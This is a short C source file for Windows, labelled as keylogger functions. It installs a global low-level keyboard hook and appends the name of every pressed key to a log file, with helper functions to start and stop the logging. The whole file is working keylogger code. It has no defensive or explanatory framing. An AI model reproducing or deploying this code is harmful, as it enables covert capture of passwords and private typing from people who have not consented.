#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Keylogger functions

HHOOK hKeyboardHook;
FILE* pLogFile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        char szKey[256];
        
        if (GetKeyNameText(pKeyBoard->scanCode << 16, szKey, sizeof(szKey))) {
            fprintf(pLogFile, "%s\n", szKey);
            fflush(pLogFile);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

BOOL InitializeKeylogger(const char* szLogFile) {
    pLogFile = fopen(szLogFile, "a");
    if (!pLogFile) {
        return FALSE;
    }
    
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    return (hKeyboardHook != NULL);
}

VOID StopKeylogger() {
    if (hKeyboardHook) {
        UnhookWindowsHookEx(hKeyboardHook);
    }
    
    if (pLogFile) {
        fclose(pLogFile);
    }
}
